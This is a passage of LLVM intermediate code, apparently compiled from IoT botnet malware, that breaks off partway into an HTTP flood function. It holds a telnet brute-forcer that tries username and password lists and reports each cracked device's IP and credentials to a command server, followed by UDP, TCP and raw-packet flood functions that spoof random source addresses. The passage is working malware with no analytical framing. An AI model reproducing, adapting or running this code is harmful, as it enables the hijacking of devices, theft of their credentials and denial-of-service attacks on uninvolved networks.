  %667 = call i32 @readUntil(i32 %663, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %664, i32 1024, i32 %666)
  %668 = icmp eq i32 %667, 0
  br i1 %668, label %687, label %669

; <label>:669:                                    ; preds = %662
  store i32 0, i32* %628, align 4
  store i16 0, i16* %639, align 16
  %670 = load i32, i32* %635, align 16
  %671 = call i64 @send(i32 %670, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %672 = load i32, i32* @mainCommSock, align 4
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %674 = load i32, i32* %673, align 4
  %675 = call i8* @inet_ntoa(i32 %674) #3
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %677 = load i8, i8* %676, align 2
  %678 = zext i8 %677 to i64
  %679 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %678
  %680 = load i8*, i8** %679, align 8
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %682 = load i8, i8* %681, align 1
  %683 = zext i8 %682 to i64
  %684 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %683
  %685 = load i8*, i8** %684, align 8
  %686 = call i32 (i32, i8*, ...) @sockprintf(i32 %672, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %675, i8* %680, i8* %685)
  br label %729

; <label>:687:                                    ; preds = %662
  %688 = load i32, i32* %635, align 16
  %689 = load i8*, i8** %637, align 8
  %690 = load i16, i16* %639, align 16
  %691 = zext i16 %690 to i32
  %692 = call i32 @readUntil(i32 %688, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %689, i32 1024, i32 %691)
  %693 = icmp eq i32 %692, 0
  br i1 %693, label %716, label %694

; <label>:694:                                    ; preds = %687
  store i32 0, i32* %628, align 4
  store i16 0, i16* %639, align 16
  %695 = load i32, i32* %635, align 16
  %696 = call i64 @send(i32 %695, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384) #3
  %697 = load i32, i32* @mainCommSock, align 4
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 1
  %699 = load i32, i32* %698, align 4
  %700 = call i8* @inet_ntoa(i32 %699) #3
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 4
  %702 = load i8, i8* %701, align 2
  %703 = zext i8 %702 to i64
  %704 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %703
  %705 = load i8*, i8** %704, align 8
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 5
  %707 = load i8, i8* %706, align 1
  %708 = zext i8 %707 to i64
  %709 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %708
  %710 = load i8*, i8** %709, align 8
  %711 = call i32 (i32, i8*, ...) @sockprintf(i32 %697, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %700, i8* %705, i8* %710)
  %712 = load i8*, i8** %637, align 8
  call void @llvm.memset.p0i8.i64(i8* %712, i8 0, i64 1024, i32 1, i1 false)
  %713 = load i32, i32* %635, align 16
  %714 = call i32 @sclose(i32 %713)
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %715, align 1
  store i8 0, i8* %40, align 8
  br label %729

; <label>:716:                                    ; preds = %687
  %717 = load i8*, i8** %637, align 8
  %718 = call i64 @strlen(i8* %717) #15
  %719 = trunc i64 %718 to i16
  store i16 %719, i16* %639, align 16
  %720 = load i32, i32* %628, align 4
  %721 = add i32 %720, 10
  %722 = zext i32 %721 to i64
  %723 = call i64 @time(i64* null) #3
  %724 = icmp slt i64 %722, %723
  br i1 %724, label %725, label %729

; <label>:725:                                    ; preds = %716
  %726 = load i32, i32* %635, align 16
  %727 = call i32 @sclose(i32 %726)
  store i8 0, i8* %40, align 8
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %38, i32 3
  store i8 1, i8* %728, align 1
  br label %729

; <label>:729:                                    ; preds = %.lr.ph, %260, %391, %591, %601, %611, %92, %89, %141, %135, %234, %225, %365, %357, %578, %569, %725, %716, %68, %694, %669, %644, %607, %597, %587, %567, %563, %550, %546, %533, %529, %516, %512, %499, %495, %482, %478, %465, %461, %448, %444, %437, %424, %420, %413, %387, %381, %353, %346, %339, %332, %325, %318, %311, %304, %297, %289, %278, %256, %250, %224, %210, %196, %182, %168, %124, %67
  %730 = add nsw i32 %.1333, 1
  %731 = icmp slt i32 %730, %11
  %brmerge = or i1 %731, %30
  %.mux = select i1 %731, i32 %730, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %729
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #13 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %6 = tail call i64 @time(i64* null) #3
  %7 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %8 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 16, i32 4, i1 false)
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #3
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 2
  %18 = load i32, i32* %17, align 8
  %19 = trunc i32 %18 to i16
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %19, i16* %20, align 4
  %21 = trunc i32 %1 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = sext i32 %2 to i64
  %25 = add nsw i64 %6, %24
  br label %26

; <label>:26:                                     ; preds = %35, %3
  %.0 = phi i32 [ 0, %3 ], [ %36, %35 ]
  %27 = icmp ugt i32 %.0, 49
  br i1 %27, label %28, label %35

; <label>:28:                                     ; preds = %26
  %29 = call i64 @send(i32 %5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i64 0, i64 0), i64 50, i32 0) #3
  %30 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %23, i32 16) #3
  %31 = call i64 @time(i64* null) #3
  %32 = icmp slt i64 %31, %25
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %28
  %34 = call i32 @close(i32 %5) #3
  call void @_exit(i32 0) #17
  unreachable

; <label>:35:                                     ; preds = %28, %26
  %.1 = phi i32 [ %.0, %26 ], [ 0, %28 ]
  %36 = add i32 %.1, 1
  br label %26
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %55

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #3
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i64 @time(i64* null) #3
  %39 = zext i32 %2 to i64
  %40 = add i64 %38, %39
  %41 = sext i32 %4 to i64
  %42 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %sext61 = shl i64 %40, 32
  %43 = ashr exact i64 %sext61, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %37
  %.058 = phi i32 [ 0, %37 ], [ %.058.be, %.backedge.backedge ]
  %44 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %41, i32 0, %struct.sockaddr* nonnull %42, i32 16) #3
  %45 = icmp eq i32 %.058, %5
  br i1 %45, label %46, label %53

; <label>:46:                                     ; preds = %.backedge
  br i1 %10, label %47, label %50

; <label>:47:                                     ; preds = %46
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %18, align 2
  br label %50

; <label>:50:                                     ; preds = %47, %46
  %51 = call i64 @time(i64* null) #3
  %52 = icmp sgt i64 %51, %43
  br i1 %52, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:53:                                     ; preds = %.backedge
  %54 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %53, %50
  %.058.be = phi i32 [ %54, %53 ], [ 0, %50 ]
  br label %.backedge

; <label>:55:                                     ; preds = %22
  %56 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %55
  %59 = load i32, i32* @mainCommSock, align 4
  %60 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %59, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %.loopexit

; <label>:61:                                     ; preds = %55
  store i32 1, i32* %8, align 4
  %62 = bitcast i32* %8 to i8*
  %63 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* nonnull %62, i32 4) #3
  %64 = icmp slt i32 %63, 0
  br i1 %64, label %65, label %.preheader.preheader

.preheader.preheader:                             ; preds = %61
  br label %.preheader

; <label>:65:                                     ; preds = %61
  %66 = load i32, i32* @mainCommSock, align 4
  %67 = call i32 (i32, i8*, ...) @sockprintf(i32 %66, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05963 = phi i32 [ %68, %.preheader ], [ 50, %.preheader.preheader ]
  %68 = add nsw i32 %.05963, -1
  %69 = call i64 @time(i64* null) #3
  %70 = call i32 @rand_cmwc()
  %71 = zext i32 %70 to i64
  %72 = xor i64 %71, %69
  %73 = trunc i64 %72 to i32
  call void @srand(i32 %73) #3
  %74 = call i32 @rand() #3
  call void @init_rand(i32 %74)
  %75 = icmp eq i32 %68, 0
  br i1 %75, label %76, label %.preheader

; <label>:76:                                     ; preds = %.preheader
  %77 = icmp eq i32 %3, 0
  %78 = sub nsw i32 32, %3
  %79 = shl i32 -1, %78
  %.060 = select i1 %77, i32 0, i32 %79
  %80 = sext i32 %4 to i64
  %81 = add nsw i64 %80, 28
  %82 = call i8* @llvm.stacksave()
  %83 = alloca i8, i64 %81, align 16
  %84 = bitcast i8* %83 to %struct.iphdr*
  %85 = getelementptr i8, i8* %83, i64 20
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = call i32 @getRandomIP(i32 %.060)
  %89 = call i32 @htonl(i32 %88) #18
  %90 = add nsw i64 %80, 8
  %91 = trunc i64 %90 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %84, i32 %87, i32 %89, i8 zeroext 17, i32 %91)
  %92 = trunc i64 %90 to i16
  %93 = call zeroext i16 @htons(i16 zeroext %92) #18
  %94 = getelementptr inbounds i8, i8* %83, i64 24
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 8
  %96 = call i32 @rand_cmwc()
  %97 = trunc i32 %96 to i16
  %98 = bitcast i8* %85 to i16*
  store i16 %97, i16* %98, align 4
  br i1 %10, label %99, label %101

; <label>:99:                                     ; preds = %76
  %100 = call i32 @rand_cmwc()
  br label %105

; <label>:101:                                    ; preds = %76
  %102 = trunc i32 %1 to i16
  %103 = call zeroext i16 @htons(i16 zeroext %102) #18
  %104 = zext i16 %103 to i32
  br label %105

; <label>:105:                                    ; preds = %101, %99
  %106 = phi i32 [ %100, %99 ], [ %104, %101 ]
  %107 = trunc i32 %106 to i16
  %108 = getelementptr inbounds i8, i8* %83, i64 22
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %110 = getelementptr inbounds i8, i8* %83, i64 26
  %111 = bitcast i8* %110 to i16*
  store i16 0, i16* %111, align 2
  %112 = getelementptr inbounds i8, i8* %83, i64 28
  call void @makeRandomStr(i8* %112, i32 %4)
  %113 = bitcast i8* %83 to i16*
  %114 = getelementptr inbounds i8, i8* %83, i64 2
  %115 = bitcast i8* %114 to i16*
  %116 = load i16, i16* %115, align 2
  %117 = zext i16 %116 to i32
  %118 = call zeroext i16 @csum(i16* nonnull %113, i32 %117)
  %119 = getelementptr inbounds i8, i8* %83, i64 10
  %120 = bitcast i8* %119 to i16*
  store i16 %118, i16* %120, align 2
  %121 = call i64 @time(i64* null) #3
  %122 = zext i32 %2 to i64
  %123 = add i64 %121, %122
  %124 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %125 = getelementptr inbounds i8, i8* %83, i64 4
  %126 = bitcast i8* %125 to i16*
  %127 = getelementptr inbounds i8, i8* %83, i64 12
  %128 = bitcast i8* %127 to i32*
  %sext = shl i64 %123, 32
  %129 = ashr exact i64 %sext, 32
  %130 = trunc i32 %1 to i16
  br label %.backedge62

.backedge62:                                      ; preds = %.backedge62.backedge, %105
  %.0 = phi i32 [ 0, %105 ], [ %.0.be, %.backedge62.backedge ]
  %131 = call i64 @sendto(i32 %56, i8* nonnull %83, i64 %81, i32 0, %struct.sockaddr* nonnull %124, i32 16) #3
  %132 = call i32 @rand_cmwc()
  %133 = trunc i32 %132 to i16
  store i16 %133, i16* %98, align 4
  br i1 %10, label %134, label %136

; <label>:134:                                    ; preds = %.backedge62
  %135 = call i32 @rand_cmwc()
  br label %139

; <label>:136:                                    ; preds = %.backedge62
  %137 = call zeroext i16 @htons(i16 zeroext %130) #18
  %138 = zext i16 %137 to i32
  br label %139

; <label>:139:                                    ; preds = %136, %134
  %140 = phi i32 [ %135, %134 ], [ %138, %136 ]
  %141 = trunc i32 %140 to i16
  store i16 %141, i16* %109, align 2
  %142 = call i32 @rand_cmwc()
  %143 = trunc i32 %142 to i16
  store i16 %143, i16* %126, align 4
  %144 = call i32 @getRandomIP(i32 %.060)
  %145 = call i32 @htonl(i32 %144) #18
  store i32 %145, i32* %128, align 4
  %146 = load i16, i16* %115, align 2
  %147 = zext i16 %146 to i32
  %148 = call zeroext i16 @csum(i16* nonnull %113, i32 %147)
  store i16 %148, i16* %120, align 2
  %149 = icmp eq i32 %.0, %5
  br i1 %149, label %150, label %153

; <label>:150:                                    ; preds = %139
  %151 = call i64 @time(i64* null) #3
  %152 = icmp sgt i64 %151, %129
  br i1 %152, label %155, label %.backedge62.backedge

; <label>:153:                                    ; preds = %139
  %154 = add i32 %.0, 1
  br label %.backedge62.backedge

.backedge62.backedge:                             ; preds = %153, %150
  %.0.be = phi i32 [ %154, %153 ], [ 0, %150 ]
  br label %.backedge62

; <label>:155:                                    ; preds = %150
  call void @llvm.stackrestore(i8* %82)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %50
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %17, %32, %155, %65, %58, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %165

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i64 0, i64 0))
  br label %165

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i64 0, i64 0))
  br label %165

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i64 0, i64 0)) #15
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.85, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.88, i64 0, i64 0)) #15
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.89, i64 0, i64 0)) #15
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i64 0, i64 0)) #15
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.91, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i64 @time(i64* null) #3
  %138 = zext i32 %2 to i64
  %139 = add i64 %137, %138
  %140 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %141 = getelementptr inbounds i8, i8* %45, i64 12
  %142 = bitcast i8* %141 to i32*
  %143 = getelementptr inbounds i8, i8* %45, i64 4
  %144 = bitcast i8* %143 to i16*
  %sext = shl i64 %139, 32
  %145 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %146 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %140, i32 16) #3
  %147 = call i32 @getRandomIP(i32 %.065)
  %148 = call i32 @htonl(i32 %147) #18
  store i32 %148, i32* %142, align 4
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  store i16 %150, i16* %144, align 4
  %151 = call i32 @rand_cmwc()
  store i32 %151, i32* %59, align 8
  %152 = call i32 @rand_cmwc()
  %153 = trunc i32 %152 to i16
  store i16 %153, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %154 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %154, i16* %114, align 4
  %155 = load i16, i16* %131, align 2
  %156 = zext i16 %155 to i32
  %157 = call zeroext i16 @csum(i16* nonnull %129, i32 %156)
  store i16 %157, i16* %136, align 2
  %158 = icmp eq i32 %.0, %6
  br i1 %158, label %159, label %162

; <label>:159:                                    ; preds = %.backedge
  %160 = call i64 @time(i64* null) #3
  %161 = icmp sgt i64 %160, %145
  br i1 %161, label %164, label %.backedge.backedge

; <label>:162:                                    ; preds = %.backedge
  %163 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %162, %159
  %.0.be = phi i32 [ %163, %162 ], [ 0, %159 ]
  br label %.backedge

; <label>:164:                                    ; preds = %159
  call void @llvm.stackrestore(i8* %44)
  br label %165

; <label>:165:                                    ; preds = %18, %164, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8* nocapture readonly, i32) local_unnamed_addr #1 {
  %3 = alloca [80 x i8*], align 16
  %4 = tail call i64 @time(i64* null) #3
  %5 = zext i32 %1 to i64
  %6 = add i64 %4, %5
  %7 = tail call i32 @rand() #3
  %8 = sext i32 %7 to i64
